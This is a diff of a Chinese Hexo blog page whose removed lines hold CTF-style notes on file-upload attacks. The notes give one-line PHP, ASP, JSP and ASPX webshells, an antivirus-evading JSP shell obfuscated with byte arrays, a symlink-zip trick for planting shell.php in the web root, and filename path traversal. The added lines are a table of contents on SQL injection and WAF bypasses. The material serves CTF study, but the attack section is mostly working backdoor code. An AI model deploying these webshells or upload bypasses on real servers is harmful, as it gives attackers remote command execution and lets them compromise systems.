-<li><p>绕过<code>&lt;?</code>：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>绕过<code>php</code>：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-</blockquote>
-<p>绕过方法：</p>
-<blockquote>
-<ul>
-<li>对渲染&#x2F;加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。</li>
-<li>对二次渲染的攻击方式就是攻击文件加载器自身。例如：</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传文件数据不完整的gif文件 -&gt; 触发报错imagecreatefromgif()函数</span><br><span class="line">上传文件数据不完整的png文件 -&gt; 触发报错imagecreatefrompng()函数</span><br></pre></td></tr></table></figure>
-
-
-
-<p>某后台调用GD库对图像进行二次渲染的代码</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function image_gd_open($file, $extension)</span><br><span class="line">&#123;</span><br><span class="line">$extension = str_replace(&#x27;jpg&#x27;, &#x27;jpeg&#x27;, $extension);</span><br><span class="line">$open_func = &#x27;imageCreateFrom&#x27;. $extension; //函数名变成imageCreateFrompng 之类</span><br><span class="line">if (!function_exists($open_func))</span><br><span class="line">&#123;</span><br><span class="line">	return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">return $open_func($file); //变成imagecreatefrompng(&#x27;/tmp/phpimage&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access&#x2F;mdb溢出。</li>
-</ul>
-</blockquote>
-<h3 id="文件上传中的目录穿越漏洞"><a href="#文件上传中的目录穿越漏洞" class="headerlink" title="文件上传中的目录穿越漏洞 #"></a>文件上传中的目录穿越漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%84%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E">#</a></h3><p>攻击方式</p>
-<blockquote>
-<p>形式：上传的文件会被解析为日志不能执行，给出了<code>/uploads/xxx.php</code>路径并且可以查询</p>
-<p>绕过：上传文件的时候抓包，修改文件名（filename）为<code>./../../../../flag</code>，上传成功后路径变为<code>/uploads/./../../../../flag</code>即可进行目录穿越</p>
-</blockquote>
-<h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码 #"></a>攻击代码 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h2><h2 id="文件压缩："><a href="#文件压缩：" class="headerlink" title="文件压缩："></a>文件压缩：</h2><p>软链接压缩包，然后上传到软链接下，放🐎进行攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html web  #创建软链接文件夹</span><br><span class="line">zip -y zip.zip web   #将软链接压缩生成一个zip.zip</span><br><span class="line"></span><br><span class="line">再在web下面放一个shell.php（🐎） </span><br><span class="line">zip -y z.zip web   #再生成一个带🐎的压缩包</span><br><span class="line"></span><br><span class="line">然后上传zip.zip，将上传路径改到可控目录/var/www/html</span><br><span class="line">然后上传z.zip，即传到了，显示的网页下（var/www/html/shell.php）</span><br><span class="line">蚁剑</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="常用攻击代码"><a href="#常用攻击代码" class="headerlink" title="常用攻击代码 #"></a>常用攻击代码 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
-<p>简单的一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>绕过<code>&lt;?</code>限制的一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language = &#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>绕过<code>&lt;?php ?&gt;</code>限制的一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>asp一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval(Request.Item[&quot;cmd&quot;],”unsafe”);%&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>JSP一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>JSP一句话免杀（ASCLL编码）</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>ASPX一句话</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>1</p>
-</blockquote>
-<h3 id="其它攻击代码"><a href="#其它攻击代码" class="headerlink" title="其它攻击代码 #"></a>其它攻击代码 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%85%B6%E5%AE%83%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
-<p>异或取反等操作写shell的php脚本、混淆木马、不死马。</p>
-</blockquote>
-<h2 id="更多参考"><a href="#更多参考" class="headerlink" title="更多参考 #"></a>更多参考 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9B%B4%E5%A4%9A%E5%8F%82%E8%80%83">#</a></h2><p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec">https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/253698.html">https://www.freebuf.com/articles/web/253698.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/179954.html">https://www.freebuf.com/articles/web/179954.html</a></p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/10/file_upload/" rel="prev" title="文件上传">
+      <i class="fa fa-chevron-left"></i> 文件上传
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-	
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
   
 
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/08/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ch.jpg">
-      <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/08/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-08 07:59:16" itemprop="dateCreated datePublished" datetime="2023-10-08T07:59:16+08:00">2023-10-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-10 18:45:09" itemprop="dateModified" datetime="2023-10-10T18:45:09+08:00">2023-10-10</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-	
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-
-  
 
 
 
@@ -1292,6 +932,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.1.</span> <span class="nav-text">联合查询</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%94%A8%E5%88%B0%E7%9A%84SQL%E8%AF%AD%E6%B3%95%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.0.0.1.</span> <span class="nav-text">联合查询用到的SQL语法知识</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">1.1.0.0.2.</span> <span class="nav-text">注入流程</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">报错注入：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%94%A8%E5%88%B0%E7%9A%84SQL%E8%AF%AD%E6%B3%95%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">报错注入用到的SQL语法知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-floor-%EF%BC%888-x-mysql-5-0%EF%BC%89-%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">0x00 floor()（8.x&gt;mysql&gt;5.0）[双查询报错注入]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-extractvalue-Writeup-2023-0xGame-Week2-rdj%E2%80%99s-Blog-notnad3-github-io-https-notnad3-github-io-2023-10-01-Week-2-ez-upload-%E3%80%90%E4%BE%8B%E9%A2%98%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E3%80%91"><span class="nav-number">1.2.0.3.</span> <span class="nav-text">0x01 extractvalue()        [Writeup_2023_0xGame_Week2 - rdj’s Blog (notnad3.github.io)](https:&#x2F;&#x2F;notnad3.github.io&#x2F;2023&#x2F;10&#x2F;01&#x2F;[Week 2] ez_upload&#x2F;)【例题，sql注入】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-UPDATEXML-XML-document-XPath-string-new-value"><span class="nav-number">1.2.0.4.</span> <span class="nav-text">0x02 UPDATEXML (XML_document, XPath_string, new_value);</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-exp-x"><span class="nav-number">1.2.0.5.</span> <span class="nav-text">0x03 exp(x)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-geometrycollection-mysql-%E7%89%88%E6%9C%AC5-5"><span class="nav-number">1.2.0.6.</span> <span class="nav-text">0x04 geometrycollection() mysql 版本5.5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-multipoint-mysql-%E7%89%88%E6%9C%AC5-5"><span class="nav-number">1.2.0.7.</span> <span class="nav-text">0x05 multipoint() mysql 版本5.5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-polygon"><span class="nav-number">1.2.0.8.</span> <span class="nav-text">0x06 polygon()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-mutipolygon"><span class="nav-number">1.2.0.9.</span> <span class="nav-text">0x07 mutipolygon()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x08-linestring-%EF%BC%89"><span class="nav-number">1.2.0.10.</span> <span class="nav-text">0x08 linestring(）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x09-multilinestring"><span class="nav-number">1.2.0.11.</span> <span class="nav-text">0x09 multilinestring()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0a-ST-LatFromGeoHash-%EF%BC%88mysql-5-7-x%EF%BC%89"><span class="nav-number">1.2.0.12.</span> <span class="nav-text">0x0a ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0b-ST-LongFromGeoHash"><span class="nav-number">1.2.0.13.</span> <span class="nav-text">0x0b ST.LongFromGeoHash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0c-ST-Pointfromgeohash-mysql-5-7"><span class="nav-number">1.2.0.14.</span> <span class="nav-text">0x0c ST_Pointfromgeohash (mysql&gt;5.7)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0d-GTID-MySQL-5-6-X-%E6%98%BE%E9%94%99"><span class="nav-number">1.2.0.15.</span> <span class="nav-text">0x0d GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0%E6%9D%A5%E6%8A%A5%E9%94%99"><span class="nav-number">1.2.0.15.0.1.</span> <span class="nav-text">使用不存在的函数来报错</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-join-using-%E6%8A%A5%E9%94%99%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="nav-number">1.2.0.15.0.2.</span> <span class="nav-text">使用 join using() 报错获取列名</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-1"><span class="nav-number">1.2.0.15.1.</span> <span class="nav-text">注入流程</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3%EF%BC%9A"><span class="nav-number">1.2.0.16.</span> <span class="nav-text">双报错注入详解：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9C%E5%B8%B8%E8%A7%81%E2%80%9D%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="nav-number">1.3.</span> <span class="nav-text">“常见”绕过：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%93%E5%B0%BE%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">结尾注释符绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">字符串变换绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-and%E3%80%81or-%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.3.</span> <span class="nav-text">过滤 and、or 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="nav-number">1.3.0.3.1.</span> <span class="nav-text">管道符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-%E8%BF%9B%E8%A1%8C%E5%BC%82%E6%88%96%E7%9B%B2%E6%B3%A8%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.3.2.</span> <span class="nav-text">使用^进行异或盲注绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.4.</span> <span class="nav-text">过滤空格绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.5.</span> <span class="nav-text">过滤括号绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-order-by-%E8%BF%9B%E8%A1%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.0.5.1.</span> <span class="nav-text">利用 order by 进行布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7%EF%BC%88-%E3%80%81%EF%BC%89%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.6.</span> <span class="nav-text">过滤比较符号（&#x3D;、&lt;、&gt;）绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-in-%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.6.1.</span> <span class="nav-text">使用 in() 绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#LIKE-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.0.6.2.</span> <span class="nav-text">LIKE 注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#REGEXP-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.0.6.3.</span> <span class="nav-text">REGEXP 注入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.7.</span> <span class="nav-text">过滤引号绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.0.7.1.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.3.0.7.1.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="nav-number">1.3.0.7.1.2.</span> <span class="nav-text">宽字节概念：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%88%90%E5%9B%A0%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.3.0.7.1.3.</span> <span class="nav-text">成因与示例</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%99%BD%E7%84%B6%E6%98%AF%E5%86%99%E5%9C%A8%E4%BA%86%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BD%86%E6%98%AF%E5%85%B6%E5%AE%9E%E4%B8%8D%E6%AD%A2%E9%80%82%E7%94%A8%E4%BA%8E%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="nav-number">1.3.0.7.1.4.</span> <span class="nav-text">虽然是写在了过滤引号的位置但是其实不止适用于过滤引号</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%8D%E6%96%9C%E6%9D%A0-%E9%80%83%E9%80%B8-Sql-%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.3.0.7.2.</span> <span class="nav-text">使用反斜杠 \ 逃逸 Sql 语句</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%97%B6%E5%88%A9%E7%94%A8-MySql-%E9%A2%84%E5%A4%84%E7%90%86"><span class="nav-number">1.3.0.8.</span> <span class="nav-text">堆叠注入时利用 MySql 预处理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#MySql-%E9%A2%84%E5%A4%84%E7%90%86%E9%85%8D%E5%90%88%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">1.3.0.8.1.</span> <span class="nav-text">MySql 预处理配合十六进制绕过关键字</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MySql%E9%A2%84%E5%A4%84%E7%90%86%E9%85%8D%E5%90%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">1.3.0.8.2.</span> <span class="nav-text">MySql预处理配合字符串拼接绕过关键字</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.9.</span> <span class="nav-text">过滤逗号绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8from%E2%80%A6for%E2%80%A6%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.9.1.</span> <span class="nav-text">使用from…for…绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8offset%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.9.2.</span> <span class="nav-text">使用offset关键字绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8join%E4%B8%8E%E5%88%AB%E5%90%8D%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.9.3.</span> <span class="nav-text">利用join与别名绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4information-schema%E7%BB%95%E8%BF%87%E4%B8%8E%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.0.10.</span> <span class="nav-text">过滤information_schema绕过与无列名注入 *</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.0.11.</span> <span class="nav-text">无列名注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#123%E6%B3%95"><span class="nav-number">1.3.0.11.1.</span> <span class="nav-text">123法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#join"><span class="nav-number">1.3.0.11.2.</span> <span class="nav-text">join</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B6%E4%BB%96%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.12.</span> <span class="nav-text">过滤其他关键字绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-if-%E8%AF%AD%E5%8F%A5%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.12.1.</span> <span class="nav-text">过滤 if 语句绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-substr-%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.13.</span> <span class="nav-text">过滤 substr 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-lpad-lpad"><span class="nav-number">1.3.0.13.1.</span> <span class="nav-text">使用 lpad&#x2F;lpad</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93-HPP-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-Waf"><span class="nav-number">1.3.0.14.</span> <span class="nav-text">HTTP参数污染(HPP)漏洞绕过 